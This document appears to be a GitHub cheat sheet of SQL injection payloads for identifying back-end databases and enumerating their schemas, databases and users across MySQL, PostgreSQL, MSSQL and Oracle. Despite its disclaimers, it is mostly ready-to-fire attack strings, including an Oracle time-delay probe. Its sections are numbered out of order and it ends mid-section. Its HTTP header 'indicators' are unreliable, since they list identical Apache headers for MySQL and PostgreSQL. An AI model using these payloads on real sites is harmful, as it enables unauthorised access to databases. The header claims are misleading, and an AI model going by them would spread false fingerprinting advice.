# Advanced SQL Injection Techniques

## Here are some Advanced SQL Injection Techniques I commonly use. Happy hunting! :+1:

**Note:** :warning::warning:These advanced techniques should be used responsibly and only in legal and authorized testing scenarios. They go beyond the basics and exploit specific features and configurations of databases. Additionally, I may have unintentionally included openly available techniques from various sources.

**WARNING:** :warning::warning:If you dont know what you are doing, please refrain from using these techniques. Improper use may harm the database. 

> The techniques showed in this repository is intended only for educational purposes and for testing in authorized environments. https://x.com/__nav1n_/ and https://github.com/ifconfig-me take no responsibility for the misuse of the techniques listed below. Use it at your own risk. Do not attack the target you don't have permission to engage with.

## Some known/ Unknown Methods to Identify the Database Used by an Application

Identifying the type of database behind a web application can be crucial for crafting specific SQL injection payloads. Though it's difficult to identify the database being used by the application, it is not impossible. Here are some methods you can use to determine the database type:

### 1. Error Message Analysis

Trigger errors to analyze the error messages returned, which often reveal the database type.

#### Example Payloads

- **Generic Error Payload**
  ```sql
  ' OR 1=1 -- 
  ```
  - Check for different error message structures.

- **Syntax Error**
  ```sql
  ' OR 'a'='a
  ```
  - Look for database-specific syntax error messages.

### 2. Database-Specific Functions

Inject payloads that use database-specific functions and observe the behavior.

#### MySQL
```sql
' AND 1=1 UNION SELECT version() --
```

#### PostgreSQL
```sql
' AND 1=1 UNION SELECT version() --
```

#### MSSQL
```sql
' AND 1=1 UNION SELECT @@version --
```

#### Oracle
```sql
' AND 1=1 UNION SELECT banner FROM v$version --
```

- **Oracle**
  ```sql
  ' AND dbms_pipe.receive_message('a', 5) --
  ```

### 5. Union-Based Enumeration

Use union-based injection to retrieve specific database metadata.

#### Example Payloads

- **MySQL**
  ```sql
  ' UNION SELECT null, schema_name FROM information_schema.schemata --
  ```

- **PostgreSQL**
  ```sql
  ' UNION SELECT null, datname FROM pg_database --
  ```

- **MSSQL**
  ```sql
  ' UNION SELECT null, name FROM master..sysdatabases --
  ```

- **Oracle**
  ```sql
  ' UNION SELECT null, username FROM all_users --
  ```

### 6. HTTP Headers and Responses

Inspect HTTP headers and responses for database-specific indicators.

#### Example Headers

- **Server Header**
  - MySQL: `Server: Apache/2.4.1 (Unix) OpenSSL/1.0.1e PHP/5.4.7`
  - PostgreSQL: `Server: Apache/2.4.1 (Unix) OpenSSL/1.0.1e PHP/5.4.7`
  - MSSQL: `Server: Microsoft-IIS/8.5`
  - Oracle: `Server: Oracle-HTTP-Server`

### 7. Identifying Database-Specific Patterns

Analyze the web application for patterns specific to certain databases.

#### Example Patterns
